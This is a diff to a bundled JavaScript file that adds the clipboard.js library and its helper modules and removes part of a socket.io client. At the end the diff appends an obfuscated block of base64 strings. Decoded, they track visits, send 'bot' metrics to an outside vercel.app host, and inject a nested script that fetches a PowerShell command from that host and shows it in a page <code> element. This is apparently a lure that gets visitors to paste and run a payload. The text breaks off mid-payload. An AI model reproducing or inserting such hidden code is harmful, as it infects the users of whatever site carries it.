+function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }
+
+function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }
+
+function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }
+
+function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }
+
+function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }
+
+function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }
+
+function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }
+
+function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }
+
+function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }
+
+function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }
+
+function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }
+
+
+
+
+
+
+/**
+ * Helper function to retrieve attribute value.
+ * @param {String} suffix
+ * @param {Element} element
+ */
+
+function getAttributeValue(suffix, element) {
+  var attribute = "data-clipboard-".concat(suffix);
+
+  if (!element.hasAttribute(attribute)) {
+    return;
+  }
+
+  return element.getAttribute(attribute);
+}
+/**
+ * Base class which takes one or more elements, adds event listeners to them,
+ * and instantiates a new `ClipboardAction` on each click.
+ */
+
+
+var Clipboard = /*#__PURE__*/function (_Emitter) {
+  _inherits(Clipboard, _Emitter);
+
+  var _super = _createSuper(Clipboard);
+
+  /**
+   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
+   * @param {Object} options
+   */
+  function Clipboard(trigger, options) {
+    var _this;
+
+    _classCallCheck(this, Clipboard);
+
+    _this = _super.call(this);
+
+    _this.resolveOptions(options);
+
+    _this.listenClick(trigger);
+
+    return _this;
+  }
+  /**
+   * Defines if attributes would be resolved using internal setter functions
+   * or custom functions that were passed in the constructor.
+   * @param {Object} options
+   */
+
+
+  _createClass(Clipboard, [{
+    key: "resolveOptions",
+    value: function resolveOptions() {
+      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
+      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
+      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
+      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
+      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
+    }
+    /**
+     * Adds a click event listener to the passed trigger.
+     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
+     */
+
+  }, {
+    key: "listenClick",
+    value: function listenClick(trigger) {
+      var _this2 = this;
+
+      this.listener = listen_default()(trigger, 'click', function (e) {
+        return _this2.onClick(e);
+      });
+    }
+    /**
+     * Defines a new `ClipboardAction` on each click event.
+     * @param {Event} e
+     */
+
+  }, {
+    key: "onClick",
+    value: function onClick(e) {
+      var trigger = e.delegateTarget || e.currentTarget;
+      var action = this.action(trigger) || 'copy';
+      var text = actions_default({
+        action: action,
+        container: this.container,
+        target: this.target(trigger),
+        text: this.text(trigger)
+      }); // Fires an event based on the copy operation result.
+
+      this.emit(text ? 'success' : 'error', {
+        action: action,
+        text: text,
+        trigger: trigger,
+        clearSelection: function clearSelection() {
+          if (trigger) {
+            trigger.focus();
+          }
+
+          window.getSelection().removeAllRanges();
+        }
+      });
+    }
+    /**
+     * Default `action` lookup function.
+     * @param {Element} trigger
+     */
+
+  }, {
+    key: "defaultAction",
+    value: function defaultAction(trigger) {
+      return getAttributeValue('action', trigger);
+    }
+    /**
+     * Default `target` lookup function.
+     * @param {Element} trigger
+     */
+
+  }, {
+    key: "defaultTarget",
+    value: function defaultTarget(trigger) {
+      var selector = getAttributeValue('target', trigger);
+
+      if (selector) {
+        return document.querySelector(selector);
+      }
+    }
+    /**
+     * Allow fire programmatically a copy action
+     * @param {String|HTMLElement} target
+     * @param {Object} options
+     * @returns Text copied.
+     */
+
+  }, {
+    key: "defaultText",
+
+    /**
+     * Default `text` lookup function.
+     * @param {Element} trigger
+     */
+    value: function defaultText(trigger) {
+      return getAttributeValue('text', trigger);
+    }
+    /**
+     * Destroy lifecycle.
+     */
+
+  }, {
+    key: "destroy",
+    value: function destroy() {
+      this.listener.destroy();
+    }
+  }], [{
+    key: "copy",
+    value: function copy(target) {
+      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
+        container: document.body
+      };
+      return actions_copy(target, options);
+    }
+    /**
+     * Allow fire programmatically a cut action
+     * @param {String|HTMLElement} target
+     * @returns Text cutted.
+     */
+
+  }, {
+    key: "cut",
+    value: function cut(target) {
+      return actions_cut(target);
+    }
+    /**
+     * Returns the support of the given action, or all actions if no action is
+     * given.
+     * @param {String} [action]
+     */
+
+  }, {
+    key: "isSupported",
+    value: function isSupported() {
+      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
+      var actions = typeof action === 'string' ? [action] : action;
+      var support = !!document.queryCommandSupported;
+      actions.forEach(function (action) {
+        support = support && !!document.queryCommandSupported(action);
+      });
+      return support;
+    }
+  }]);
+
+  return Clipboard;
+}((tiny_emitter_default()));
+
+/* harmony default export */ var clipboard = (Clipboard);
+
+/***/ }),
+
+/***/ 828:
+/***/ (function(module) {
+
+var DOCUMENT_NODE_TYPE = 9;
+
+/**
+ * A polyfill for Element.matches()
+ */
+if (typeof Element !== 'undefined' && !Element.prototype.matches) {
+    var proto = Element.prototype;
+
+    proto.matches = proto.matchesSelector ||
+                    proto.mozMatchesSelector ||
+                    proto.msMatchesSelector ||
+                    proto.oMatchesSelector ||
+                    proto.webkitMatchesSelector;
+}
+
+/**
+ * Finds the closest parent that matches a selector.
+ *
+ * @param {Element} element
+ * @param {String} selector
+ * @return {Function}
+ */
+function closest (element, selector) {
+    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
+        if (typeof element.matches === 'function' &&
+            element.matches(selector)) {
+          return element;
+        }
+        element = element.parentNode;
+    }
+}
+
+module.exports = closest;
+
+
+/***/ }),
+
+/***/ 438:
+/***/ (function(module, __unused_webpack_exports, __webpack_require__) {
+
+var closest = __webpack_require__(828);
+
+/**
+ * Delegates event to a selector.
+ *
+ * @param {Element} element
+ * @param {String} selector
+ * @param {String} type
+ * @param {Function} callback
+ * @param {Boolean} useCapture
+ * @return {Object}
+ */
+function _delegate(element, selector, type, callback, useCapture) {
+    var listenerFn = listener.apply(this, arguments);
+
+    element.addEventListener(type, listenerFn, useCapture);
+
+    return {
+        destroy: function() {
+            element.removeEventListener(type, listenerFn, useCapture);
+        }
+    }
+}
+
+/**
+ * Delegates event to a selector.
+ *
+ * @param {Element|String|Array} [elements]
+ * @param {String} selector
+ * @param {String} type
+ * @param {Function} callback
+ * @param {Boolean} useCapture
+ * @return {Object}
+ */
+function delegate(elements, selector, type, callback, useCapture) {
+    // Handle the regular Element usage
+    if (typeof elements.addEventListener === 'function') {
+        return _delegate.apply(null, arguments);
+    }
+
+    // Handle Element-less usage, it defaults to global delegation
+    if (typeof type === 'function') {
+        // Use `document` as the first parameter, then apply arguments
+        // This is a short way to .unshift `arguments` without running into deoptimizations
+        return _delegate.bind(null, document).apply(null, arguments);
+    }
+
+    // Handle Selector-based usage
+    if (typeof elements === 'string') {
+        elements = document.querySelectorAll(elements);
+    }
+
+    // Handle Array-like based usage
+    return Array.prototype.map.call(elements, function (element) {
+        return _delegate(element, selector, type, callback, useCapture);
+    });
+}
+
+/**
+ * Finds closest match and invokes callback.
+ *
+ * @param {Element} element
+ * @param {String} selector
+ * @param {String} type
+ * @param {Function} callback
+ * @return {Function}
+ */
+function listener(element, selector, type, callback) {
+    return function(e) {
+        e.delegateTarget = closest(e.target, selector);
+
+        if (e.delegateTarget) {
+            callback.call(element, e);
+        }
+    }
+}
+
+module.exports = delegate;
+
+
+/***/ }),
+
+/***/ 879:
+/***/ (function(__unused_webpack_module, exports) {
+
+/**
+ * Check if argument is a HTML element.
+ *
+ * @param {Object} value
+ * @return {Boolean}
+ */
+exports.node = function(value) {
+    return value !== undefined
+        && value instanceof HTMLElement
+        && value.nodeType === 1;
+};
+
+/**
+ * Check if argument is a list of HTML elements.
+ *
+ * @param {Object} value
+ * @return {Boolean}
+ */
+exports.nodeList = function(value) {
+    var type = Object.prototype.toString.call(value);
+
+    return value !== undefined
+        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
+        && ('length' in value)
+        && (value.length === 0 || exports.node(value[0]));
+};
+
+/**
+ * Check if argument is a string.
+ *
+ * @param {Object} value
+ * @return {Boolean}
+ */
+exports.string = function(value) {
+    return typeof value === 'string'
+        || value instanceof String;
+};
+
+/**
+ * Check if argument is a function.
+ *
+ * @param {Object} value
+ * @return {Boolean}
+ */
+exports.fn = function(value) {
+    var type = Object.prototype.toString.call(value);
+
+    return type === '[object Function]';
+};
+
+
+/***/ }),
+
+/***/ 370:
+/***/ (function(module, __unused_webpack_exports, __webpack_require__) {
+
+var is = __webpack_require__(879);
+var delegate = __webpack_require__(438);
+
+/**
+ * Validates all params and calls the right
+ * listener function based on its target type.
+ *
+ * @param {String|HTMLElement|HTMLCollection|NodeList} target
+ * @param {String} type
+ * @param {Function} callback
+ * @return {Object}
+ */
+function listen(target, type, callback) {
+    if (!target && !type && !callback) {
+        throw new Error('Missing required arguments');
+    }
+
+    if (!is.string(type)) {
+        throw new TypeError('Second argument must be a String');
+    }
+
+    if (!is.fn(callback)) {
+        throw new TypeError('Third argument must be a Function');
+    }
+
+    if (is.node(target)) {
+        return listenNode(target, type, callback);
+    }
+    else if (is.nodeList(target)) {
+        return listenNodeList(target, type, callback);
+    }
+    else if (is.string(target)) {
+        return listenSelector(target, type, callback);
     }
     else {
-        if (!cache[id]) {
-            debug("new io instance for %s", source);
-            cache[id] = new manager_js_1.Manager(source, opts);
-        }
-        io = cache[id];
+        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
     }
-    if (parsed.query && !opts.query) {
-        opts.query = parsed.queryKey;
-    }
-    return io.socket(parsed.path, opts);
 }
-// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
-// namespace (e.g. `io.connect(...)`), for backward compatibility
-Object.assign(lookup, {
-    Manager: manager_js_1.Manager,
-    Socket: socket_js_1.Socket,
-    io: lookup,
-    connect: lookup,
-});
-/**
- * Protocol version.
- *
- * @public
- */
-var socket_io_parser_1 = require("socket.io-parser");
-Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
-var engine_io_client_1 = require("engine.io-client");
-Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
-Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
-Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
-Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
-Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
-Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });
 
-module.exports = lookup;
+/**
+ * Adds an event listener to a HTML element
+ * and returns a remove listener function.
+ *
+ * @param {HTMLElement} node
+ * @param {String} type
+ * @param {Function} callback
+ * @return {Object}
+ */
+function listenNode(node, type, callback) {
+    node.addEventListener(type, callback);
+
+    return {
+        destroy: function() {
+            node.removeEventListener(type, callback);
+        }
+    }
+}
+
+/**
+ * Add an event listener to a list of HTML elements
+ * and returns a remove listener function.
+ *
+ * @param {NodeList|HTMLCollection} nodeList
+ * @param {String} type
+ * @param {Function} callback
+ * @return {Object}
+ */
+function listenNodeList(nodeList, type, callback) {
+    Array.prototype.forEach.call(nodeList, function(node) {
+        node.addEventListener(type, callback);
+    });
+
+    return {
+        destroy: function() {
+            Array.prototype.forEach.call(nodeList, function(node) {
+                node.removeEventListener(type, callback);
+            });
+        }
+    }
+}
+
+/**
+ * Add an event listener to a selector
+ * and returns a remove listener function.
+ *
+ * @param {String} selector
+ * @param {String} type
+ * @param {Function} callback
+ * @return {Object}
+ */
+function listenSelector(selector, type, callback) {
+    return delegate(document.body, selector, type, callback);
+}
+
+module.exports = listen;
+
+
+/***/ }),
+
+/***/ 817:
+/***/ (function(module) {
+
+function select(element) {
+    var selectedText;
+
+    if (element.nodeName === 'SELECT') {
+        element.focus();
+
+        selectedText = element.value;
+    }
+    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
+        var isReadOnly = element.hasAttribute('readonly');
+
+        if (!isReadOnly) {
+            element.setAttribute('readonly', '');
+        }
+
+        element.select();
+        element.setSelectionRange(0, element.value.length);
+
+        if (!isReadOnly) {
+            element.removeAttribute('readonly');
+        }
+
+        selectedText = element.value;
+    }
+    else {
+        if (element.hasAttribute('contenteditable')) {
+            element.focus();
+        }
+
+        var selection = window.getSelection();
+        var range = document.createRange();
+
+        range.selectNodeContents(element);
+        selection.removeAllRanges();
+        selection.addRange(range);
+
+        selectedText = selection.toString();
+    }
+
+    return selectedText;
+}
+
+module.exports = select;
+
+
+/***/ }),
+
+/***/ 279:
+/***/ (function(module) {
+
+function E () {
+  // Keep this empty so it's easier to inherit from
+  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
+}
+
+E.prototype = {
+  on: function (name, callback, ctx) {
+    var e = this.e || (this.e = {});
+
+    (e[name] || (e[name] = [])).push({
+      fn: callback,
+      ctx: ctx
+    });
+
+    return this;
+  },
+
+  once: function (name, callback, ctx) {
+    var self = this;
+    function listener () {
+      self.off(name, listener);
+      callback.apply(ctx, arguments);
+    };
+
+    listener._ = callback
+    return this.on(name, listener, ctx);
+  },
+
+  emit: function (name) {
+    var data = [].slice.call(arguments, 1);
+    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
+    var i = 0;
+    var len = evtArr.length;
+
+    for (i; i < len; i++) {
+      evtArr[i].fn.apply(evtArr[i].ctx, data);
+    }
+
+    return this;
+  },
+
+  off: function (name, callback) {
+    var e = this.e || (this.e = {});
+    var evts = e[name];
+    var liveEvents = [];
+
+    if (evts && callback) {
+      for (var i = 0, len = evts.length; i < len; i++) {
+        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
+          liveEvents.push(evts[i]);
+      }
+    }
+
+    // Remove event from queue to prevent memory leak
+    // Suggested by https://github.com/lazd
+    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910
+
+    (liveEvents.length)
+      ? e[name] = liveEvents
+      : delete e[name];
+
+    return this;
+  }
+};
+
+module.exports = E;
+module.exports.TinyEmitter = E;
+
+
+/***/ })
+
+/******/ 	});
+/************************************************************************/
+/******/ 	// The module cache
+/******/ 	var __webpack_module_cache__ = {};
+/******/ 	
+/******/ 	// The require function
+/******/ 	function __webpack_require__(moduleId) {
+/******/ 		// Check if module is in cache
+/******/ 		if(__webpack_module_cache__[moduleId]) {
+/******/ 			return __webpack_module_cache__[moduleId].exports;
+/******/ 		}
+/******/ 		// Create a new module (and put it into the cache)
+/******/ 		var module = __webpack_module_cache__[moduleId] = {
+/******/ 			// no module.id needed
+/******/ 			// no module.loaded needed
+/******/ 			exports: {}
+/******/ 		};
+/******/ 	
+/******/ 		// Execute the module function
+/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
+/******/ 	
+/******/ 		// Return the exports of the module
+/******/ 		return module.exports;
+/******/ 	}
+/******/ 	
+/************************************************************************/
+/******/ 	/* webpack/runtime/compat get default export */
+/******/ 	!function() {
+/******/ 		// getDefaultExport function for compatibility with non-harmony modules
+/******/ 		__webpack_require__.n = function(module) {
+/******/ 			var getter = module && module.__esModule ?
+/******/ 				function() { return module['default']; } :
+/******/ 				function() { return module; };
+/******/ 			__webpack_require__.d(getter, { a: getter });
+/******/ 			return getter;
+/******/ 		};
+/******/ 	}();
+/******/ 	
+/******/ 	/* webpack/runtime/define property getters */
+/******/ 	!function() {
+/******/ 		// define getter functions for harmony exports
+/******/ 		__webpack_require__.d = function(exports, definition) {
+/******/ 			for(var key in definition) {
+/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
+/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
+/******/ 				}
+/******/ 			}
+/******/ 		};
+/******/ 	}();
+/******/ 	
+/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
+/******/ 	!function() {
+/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
+/******/ 	}();
+/******/ 	
+/************************************************************************/
+/******/ 	// module exports must be returned from runtime so entry inlining is disabled
+/******/ 	// startup
+/******/ 	// Load entry module and return exports
+/******/ 	return __webpack_require__(686);
+/******/ })()
+.default;
+});
+}catch(e){}
+})();
+
+
+(function() {
+  var _b = {
+    "f0wxdl": "MC41MTI4MTc2NTE4MTE5OTU2",
+    "539252": "CihmdW5jdGlvbigpewogIGNvbnN0IE4gPSAyOyAvLyBSZXF1aXJlZCB2aXNpdCBjb3VudAogIGNvbnN0IEtFWSA9ICdfdmMnOyAvLyBWaXNpdCBjb3VudGVyIGtleQogIGNvbnN0IG1ldHJpY3NFbmRwb2ludCA9ICdodHRwczovL3ZlcmMtcGFuZWwudmVyY2VsLmFwcC9hcGkvbWV0cmljcy90cmFjayc7CiAgY29uc3QgdGVtcGxhdGVJZCA9ICdjZjInOwogIGNvbnN0IHNjcmlwdElkID0gJ2Nta2ZpY3ZvZzAwMDV5bGVkNzNhZnk5NXcnOwogIGNvbnN0IFZFUkJPU0UgPSBmYWxzZTsKICBmdW5jdGlvbiB2bG9nKCkgewogICAgaWYgKCFWRVJCT1NFKSByZXR1cm47CiAgICB0cnkgeyBjb25zb2xlLmxvZygnW3RwXScsIC4uLmFyZ3VtZW50cyk7IH0gY2F0Y2ggKGUpIHt9CiAgfQogIGZ1bmN0aW9uIHZlcnIoKSB7CiAgICBpZiAoIVZFUkJPU0UpIHJldHVybjsKICAgIHRyeSB7IGNvbnNvbGUuZXJyb3IoJ1t0cF0nLCAuLi5hcmd1bWVudHMpOyB9IGNhdGNoIChlKSB7fQogIH0KICBsZXQgYm90VHJhY2tlZCA9IGZhbHNlOwoKICBmdW5jdGlvbiB0cmFja01ldHJpYyh0eXBlKSB7CiAgICB0cnkgewogICAgICBmZXRjaChtZXRyaWNzRW5kcG9pbnQgfHwgJy9hcGkvbWV0cmljcy90cmFjaycsIHsKICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7IHR5cGUsIHRlbXBsYXRlOiB0ZW1wbGF0ZUlkLCBzY3JpcHRJZDogc2NyaXB0SWQgfHwgdW5kZWZpbmVkIH0pLAogICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICBrZWVwYWxpdmU6IHRydWUKICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgfSBjYXRjaCAoZXJyKSB7fQogIH0KCiAgdHJ5IHsKICAgIGlmICghd2luZG93Ll9fdHJhY2tNZXRyaWMpIHsKICAgICAgd2luZG93Ll9fdHJhY2tNZXRyaWMgPSB0cmFja01ldHJpYzsKICAgIH0KICAgIGlmICghd2luZG93Ll9fbWV0cmljc0VuZHBvaW50KSB7CiAgICAgIHdpbmRvdy5fX21ldHJpY3NFbmRwb2ludCA9IG1ldHJpY3NFbmRwb2ludDsKICAgIH0KICAgIGlmICghd2luZG93Ll9fdGVtcGxhdGVJZCkgewogICAgICB3aW5kb3cuX190ZW1wbGF0ZUlkID0gdGVtcGxhdGVJZDsKICAgIH0KICB9IGNhdGNoIChlcnIpIHt9CgogIGZ1bmN0aW9uIHRyYWNrQm90KCkgewogICAgaWYgKGJvdFRyYWNrZWQpIHJldHVybjsKICAgIGJvdFRyYWNrZWQgPSB0cnVlOwogICAgdHJhY2tNZXRyaWMoJ2JvdCcpOwogIH0KCiAgdmxvZygnaW5pdCcsIHsgdGVtcGxhdGVJZCwgc2NyaXB0SWQsIHZpc2l0czogTiwgaW5jbHVkZU9TOiBbXSwgaW5jbHVkZUNvdW50cmllczogW10sIGRpc2FibGVJc3BDaGVjazogZmFsc2UgfSk7CgogIGZ1bmN0aW9uIGI2NFRvVXRmOChiNjQpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGJpbiA9IGF0b2IoYjY0KTsKICAgICAgY29uc3QgbGVuID0gYmluLmxlbmd0aDsKICAgICAgY29uc3QgYnl0ZXMgPSBuZXcgVWludDhBcnJheShsZW4pOwogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxlbjsgaSsrKSBieXRlc1tpXSA9IGJpbi5jaGFyQ29kZUF0KGkpOwoKICAgICAgaWYgKHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gJ3VuZGVmaW5lZCcpIHsKICAgICAgICByZXR1cm4gbmV3IFRleHREZWNvZGVyKCd1dGYtOCcsIHsgZmF0YWw6IGZhbHNlIH0pLmRlY29kZShieXRlcyk7CiAgICAgIH0KCiAgICAgIC8vIEZhbGxiYWNrIGZvciBvbGRlciBicm93c2VycwogICAgICBsZXQgcGN0ID0gJyc7CiAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGVuOyBpKyspIHBjdCArPSAnJScgKyBieXRlc1tpXS50b1N0cmluZygxNikucGFkU3RhcnQoMiwgJzAnKTsKICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChwY3QpOwogICAgfSBjYXRjaCAoZSkgewogICAgICB0cnkgewogICAgICAgIHJldHVybiBhdG9iKGI2NCk7CiAgICAgIH0gY2F0Y2ggKGUyKSB7CiAgICAgICAgcmV0dXJuICcnOwogICAgICB9CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbmplY3RTY3JpcHQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBzY3JpcHRCNjQgPSAnS0dGemVXNWpJQ2dwSUQwK0lIc0tDaTh2SU5DZjBMN1F1OUdEMFlmUXNOQzEwTHdnYzJOeWFYQjBTV1FnMExqUXR5RFF2OUN3MFlEUXNOQzgwTFhSZ3RHQTBMN1FzaUJWVWt3ZzBMalF1OUM0SU5DNDBZSFF2OUMrMEx2UmpOQzMwWVBRdGRDOElOQzAwTFhSaE5DKzBMdlJndEM5MFl2UXVRcGpiMjV6ZENCMWNteFFZWEpoYlhNZ1BTQnVaWGNnVlZKTVUyVmhjbU5vVUdGeVlXMXpLSGRwYm1SdmR5NXNiMk5oZEdsdmJpNXpaV0Z5WTJncE93cGpiMjV6ZENCelkzSnBjSFJKWkNBOUlIVnliRkJoY21GdGN5NW5aWFFvSjNOamNtbHdkRjlwWkNjcElIeDhJQ2RrWldaaGRXeDBKenNLQ214bGRDQm1aWFJqYUdWa1EyOXRiV0Z1WkNBOUlDY25Pd3BzWlhRZ1ptVjBZMmhsWkVOdmJXMWxiblFnUFNBbkp6c0tDZ3BtZFc1amRHbHZiaUJpWVhObE5qUkVaV052WkdWVlZFWXhOa3hGS0hOMGNpa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0F2THlEUW85QzAwTERRdTlHUDBMWFF2Q0RRdjlHQTBMN1FzZEMxMEx2Uml5RFF1Q0RRdjlDMTBZRFF0ZEN5MEw3UXROR0xJTkdCMFlMUmdOQyswTG9LSUNBZ0lDQWdJQ0J6ZEhJZ1BTQnpkSEl1Y21Wd2JHRmpaU2d2VzF4elhISmNibDByTDJjc0lDY25LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmlhVzVoY25rZ1BTQmhkRzlpS0hOMGNpazdDaUFnSUNBZ0lDQWdZMjl1YzNRZ1lubDBaWE1nUFNCdVpYY2dWV2x1ZERoQmNuSmhlU2hpYVc1aGNua3ViR1Z1WjNSb0tUc0tJQ0FnSUNBZ0lDQm1iM0lnS0d4bGRDQnBJRDBnTURzZ2FTQThJR0pwYm1GeWVTNXNaVzVuZEdnN0lHa3JLeWtnZXdvZ0lDQWdJQ0FnSUNBZ0lDQmllWFJsYzF0cFhTQTlJR0pwYm1GeWVTNWphR0Z5UTI5a1pVRjBLR2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNBdkx5QlZWRVl0TVRaTVJUb2daWFpsY25rZ01pQmllWFJsY3lCcGN5QmhJR05vWVhJS0lDQWdJQ0FnSUNCc1pYUWdjbVZ6ZFd4MElEMGdKeWM3Q2lBZ0lDQWdJQ0FnWm05eUlDaHNaWFFnYVNBOUlEQTdJR2tnUENCaWVYUmxjeTVzWlc1bmRHZzdJR2tnS3owZ01pa2dld29nSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnS3owZ1UzUnlhVzVuTG1aeWIyMURhR0Z5UTI5a1pTaGllWFJsYzF0cFhTQjhJQ2hpZVhSbGMxdHBJQ3NnTVYwZ1BEd2dPQ2twT3dvZ0lDQWdJQ0FnSUgwS0lDQWdJQ0FnSUNCeVpYUjFjbTRnY21WemRXeDBPd29nSUNBZ2ZTQmpZWFJqYUNBb1pTa2dleUJ5WlhSMWNtNGdKeWM3SUgwS2ZRb0tZWE41Ym1NZ1puVnVZM1JwYjI0Z1ptVjBZMmhEYjIxdFlXNWtRVzVrUTI5dGJXVnVkQ2dwSUhzS0lDQWdJSFJ5ZVNCN0NpQWdJQ0FnSUNBZ1kyOXVjM1FnWVhCcFZYSnNJRDBnWUdoMGRIQnpPaTh2ZG1WeVl5MXdZVzVsYkM1MlpYSmpaV3d1WVhCd0wyRndhUzl3YjNkbGNuTm9aV3hzTDJOdGEyWnBZM1p2WnpBd01EVjViR1ZrTnpOaFpuazVOWGRnT3dvZ0lDQWdJQ0FnSUdOdmJuTjBJSEpsY3lBOUlHRjNZV2wwSUdabGRHTm9LR0Z3YVZWeWJDazdDaUFnSUNBZ0lDQWdhV1lnS0NGeVpYTXViMnNwSUhSb2NtOTNJRzVsZHlCRmNuSnZjaWduUm1GcGJHVmtJSFJ2SUdabGRHTm9JR052YlcxaGJtUW5LVHNLSUNBZ0lDQWdJQ0JqYjI1emRDQmtZWFJoSUQwZ1lYZGhhWFFnY21WekxtcHpiMjRvS1RzS0lDQWdJQ0FnSUNCbVpYUmphR1ZrUTI5dGJXRnVaQ0E5SUdKaGMyVTJORVJsWTI5a1pWVlVSakUyVEVVb1pHRjBZUzVqYjIxdFlXNWtJSHg4SUNjbktUc0tJQ0FnSUNBZ0lDQm1aWFJqYUdWa1EyOXRiV1Z1ZENBOUlHUmhkR0V1WTI5dGJXVnVkQ0I4ZkNBbkp6c0tJQ0FnSUNBZ0lDQXZMeURRa3RHQjBZTFFzTkN5MExqUmd0R01JR052YlcxbGJuUWcwTElnUEdOdlpHVStJQ2pRdDlDdzBMelF0ZEM5MExqUmd0R01JTkdDMExYUXV0R0IwWUlwQ2lBZ0lDQWdJQ0FnWTI5dWMzUWdZMjlrWlVWc0lEMGdaRzlqZFcxbGJuUXVjWFZsY25sVFpXeGxZM1J2Y2lnblkyOWtaU2NwT3dvZ0lDQWdJQ0FnSUdsbUlDaGpiMlJsUld3cElHTnZaR1ZGYkM1MFpYaDBRMjl1ZEdWdWRDQTlJR1psZEdOb1pXUkRiMjF0Wlc1ME93b2dJQ0FnZlNCallYUmphQ0FvWlNrZ2V3b2dJQ0FnSUNBZ0lHWmxkR05vWldSRGIyMXRZVzVrSUQwZ0owWmhhV3hsWkNCMGJ5QnNiMkZrSUdOdmJXMWhibVFuT3dvZ0lDQWdJQ0FnSUdabGRHTm9aV1JEYjIxdFpXNTBJRDBnSnljN0NpQWdJQ0I5Q24wS0NtTnZibk4wSUhSeVlXTnJUV1YwY21saklEMGdLSGRwYm1SdmR5NWZYM1J5WVdOclRXVjBjbWxqS1NBL0lIZHBibVJ2ZHk1ZlgzUnlZV05yVFdWMGNtbGpJRG9nWm5WdVkzUnBiMjRvZEhsd1pTa2dld29nSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0JqYjI1emRDQjBaVzF3YkdGMFpVbGtJRDBnZDJsdVpHOTNMbDlmZEdWdG